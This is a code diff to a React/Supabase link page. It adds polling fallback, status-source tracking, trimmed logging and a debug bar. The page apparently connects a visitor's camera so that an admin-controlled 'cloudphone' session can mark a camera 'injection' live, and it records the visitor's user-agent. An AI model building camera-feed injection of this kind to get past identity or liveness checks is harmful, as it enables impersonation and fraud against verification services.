@@ -14,6 +14,7 @@ export const Route = createFileRoute("/link/$linkId")({
 });
 
 type SessionStatus = "idle" | "preparing" | "ready_for_user" | "injecting" | "live";
+type StatusSource = "init" | "realtime" | "poll";
 
 interface LinkConfig {
   label: string;
@@ -34,7 +35,10 @@ function LinkPage() {
   const { linkId } = Route.useParams();
   const [load, setLoad] = useState<LoadState>({ kind: "loading" });
   const [sessionStatus, setSessionStatus] = useState<SessionStatus>("idle");
+  const [statusSource, setStatusSource] = useState<StatusSource>("init");
+  const [rtStatus, setRtStatus] = useState<string>("connecting");
 
+  // Initial fetch of link config + current session_status
   useEffect(() => {
     let cancelled = false;
     (async () => {
@@ -72,13 +76,14 @@ function LinkPage() {
       };
       setLoad({ kind: "ready", config: cfg });
       setSessionStatus(cfg.session_status);
+      setStatusSource("init");
     })();
     return () => {
       cancelled = true;
     };
   }, [linkId]);
 
-  // Subscribe to realtime updates of the link's session_status
+  // Realtime subscription to session_status changes
   useEffect(() => {
     const filter = `id=eq.${linkId}`;
     const channel = supabase
@@ -87,22 +92,49 @@ function LinkPage() {
         "postgres_changes",
         { event: "UPDATE", schema: "public", table: "links", filter },
         (payload) => {
-          console.log("[LinkPage] realtime links UPDATE received", {
-            linkId,
-            filter,
-            oldStatus: (payload.old as any)?.session_status,
-            newStatus: (payload.new as any)?.session_status,
-            payload,
-          });
           const next = (payload.new as any)?.session_status as SessionStatus | undefined;
-          if (next) setSessionStatus(next);
+          console.log("[LinkPage] realtime UPDATE", {
+            linkId,
+            oldStatus: (payload.old as any)?.session_status,
+            newStatus: next,
+          });
+          if (next) {
+            setSessionStatus(next);
+            setStatusSource("realtime");
+          }
         },
       )
       .subscribe((status, error) => {
-        console.log("[LinkPage] realtime subscription status", { linkId, filter, status, error });
+        console.log("[LinkPage] realtime subscription", { linkId, status, error });
+        setRtStatus(String(status).toLowerCase());
       });
     return () => {
       supabase.removeChannel(channel);
+    };
+  }, [linkId]);
+
+  // 2-second polling fallback (reliability net if realtime drops events)
+  useEffect(() => {
+    let cancelled = false;
+    const id = setInterval(async () => {
+      const { data, error } = await supabase
+        .from("links")
+        .select("session_status")
+        .eq("id", linkId)
+        .maybeSingle();
+      if (cancelled || error || !data) return;
+      const next = ((data as any).session_status as SessionStatus) ?? "idle";
+      setSessionStatus((prev) => {
+        if (prev !== next) {
+          console.log("[LinkPage] poll detected change", { from: prev, to: next });
+          setStatusSource("poll");
+        }
+        return next;
+      });
+    }, 2000);
+    return () => {
+      cancelled = true;
+      clearInterval(id);
     };
   }, [linkId]);
 
@@ -132,17 +164,29 @@ function LinkPage() {
     );
   }
 
-  return <LiveLink linkId={linkId} config={load.config} sessionStatus={sessionStatus} />;
+  return (
+    <LiveLink
+      linkId={linkId}
+      config={load.config}
+      sessionStatus={sessionStatus}
+      statusSource={statusSource}
+      rtStatus={rtStatus}
+    />
+  );
 }
 
 function LiveLink({
   linkId,
   config,
   sessionStatus,
+  statusSource,
+  rtStatus,
 }: {
   linkId: string;
   config: LinkConfig;
   sessionStatus: SessionStatus;
+  statusSource: StatusSource;
+  rtStatus: string;
 }) {
   const initialRequired: "back" | "front" =
     config.camera_mode === "locked_front" ? "front" :
@@ -162,16 +206,16 @@ function LiveLink({
   const startedRef = useRef(false);
   const injectionMarkedRef = useRef(false);
 
-  // Auto-connect once status becomes ready_for_user
+  // 1) Auto-connect once when admin signals ready
   useEffect(() => {
     if (sessionStatus !== "ready_for_user") return;
     if (startedRef.current) return;
     startedRef.current = true;
+    console.log("[LinkPage] ready_for_user → start()");
     void start();
   }, [sessionStatus, start]);
 
-  // When injection succeeds (cloudphone status shows camera active/live),
-  // mark session_status = 'injecting' and write user-agent + timestamp.
+  // 2) When injection succeeds, mark session_status = 'injecting' (once)
   useEffect(() => {
     if (injectionMarkedRef.current) return;
     const s = status.toLowerCase();
@@ -192,16 +236,9 @@ function LiveLink({
         } as any)
         .eq("id", linkId);
       if (result.error) {
-        console.error("[LinkPage] session_status update failed", {
-          linkId,
-          status: "injecting",
-          error: result.error,
-        });
+        console.error("[LinkPage] mark injecting failed", result.error);
       } else {
-        console.log("[LinkPage] session_status update succeeded", {
-          linkId,
-          status: "injecting",
-        });
+        console.log("[LinkPage] marked session_status = injecting");
       }
     })();
   }, [status, linkId]);
@@ -215,6 +252,12 @@ function LiveLink({
           Please wait, preparing your session…
         </p>
         <Spinner />
+        <DebugBar
+          sessionStatus={sessionStatus}
+          rtStatus={rtStatus}
+          statusSource={statusSource}
+          hookStatus={status}
+        />
       </CenteredShell>
     );
   }
@@ -245,6 +288,13 @@ function LiveLink({
         </div>
 
         <p className="text-sm text-muted-foreground">{friendly}</p>
+
+        <DebugBar
+          sessionStatus={sessionStatus}
+          rtStatus={rtStatus}
+          statusSource={statusSource}
+          hookStatus={status}
+        />
       </div>
     </div>
   );
@@ -274,6 +324,27 @@ function friendlyStatus(raw: string): string {
     return "Something went wrong. Please try again.";
   }
   return "Connecting…";
+}
+
+function DebugBar({
+  sessionStatus,
+  rtStatus,
+  statusSource,
+  hookStatus,
+}: {
+  sessionStatus: SessionStatus;
+  rtStatus: string;
+  statusSource: StatusSource;
+  hookStatus: string;
+}) {
+  return (
+    <div className="mt-4 w-full max-w-[360px] rounded-md border border-border bg-muted/40 px-3 py-2 font-mono text-[10px] leading-tight text-muted-foreground">
+      <div>status: {sessionStatus}</div>
+      <div>rt: {rtStatus}</div>
+      <div>src: {statusSource}</div>
+      <div className="break-words">hook: {hookStatus}</div>
+    </div>
+  );
 }
 
 function Spinner() {
